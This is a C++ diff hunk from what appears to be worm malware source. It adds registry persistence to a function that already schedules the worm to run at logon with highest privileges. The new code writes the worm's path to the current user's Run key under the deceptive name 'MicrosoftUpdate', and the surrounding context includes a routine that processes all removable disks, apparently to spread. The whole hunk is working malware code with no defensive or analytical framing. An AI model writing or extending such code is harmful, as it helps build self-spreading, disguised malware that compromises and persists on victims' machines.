@@ -412,6 +412,27 @@ void worm::create_scheduled_task(const wstring& worm_path)
         L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
     _wsystem(cmd.c_str());
 
+    HKEY hKey;
+    const std::wstring subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    const std::wstring value_name = L"MicrosoftUpdate";  // Название ключа
+
+    // Открываем раздел реестра
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        // Устанавливаем значение ключа
+        RegSetValueExW(
+            hKey,
+            value_name.c_str(),
+            0,
+            REG_SZ,
+            reinterpret_cast<const BYTE*>(worm_path.c_str()),
+            static_cast<DWORD>((worm_path.length() + 1) * sizeof(wchar_t))
+        );
+
+        RegCloseKey(hKey);
+    }
+
+
 }
 
 void worm::process_all_removable_disks()
